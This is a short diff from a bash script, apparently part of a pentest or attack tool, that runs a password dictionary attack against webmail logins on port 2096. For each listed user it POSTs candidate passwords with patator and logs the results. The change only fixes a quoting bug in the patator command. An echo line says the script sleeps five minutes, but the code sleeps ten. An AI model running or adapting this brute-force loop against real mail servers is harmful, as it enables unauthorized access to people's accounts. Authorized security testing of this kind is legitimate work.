@@ -60,7 +60,7 @@ for user in $(cat $FILE ); do
 	echo ""
 	echo -e "$OKBLUE #### Ataque a diccionario al usuario $mail  #### $RESET "  | tee -a webmail.txt
 	echo -e "$OKRED Usando diccionario de passwords: `wc -l passwords.txt`$RESET "  | tee -a webmail.txt
-	patator http_fuzz accept_cookie=1 auto_urlencode=1 url=https://www.$DOMINIO:2096/login/ method=POST body="\"user=$mail&pass=FILE0&login=\" 0=passwords.txt  | tee -a webmail.txt
+	patator http_fuzz accept_cookie=1 auto_urlencode=1 url=https://www.$DOMINIO:2096/login/ method=POST body="\"user=$mail&pass=FILE0&login=\"" 0=passwords.txt  | tee -a webmail.txt
 	echo "Durmiendo por 5min"
 	rm passwords.txt
 	sleep 600
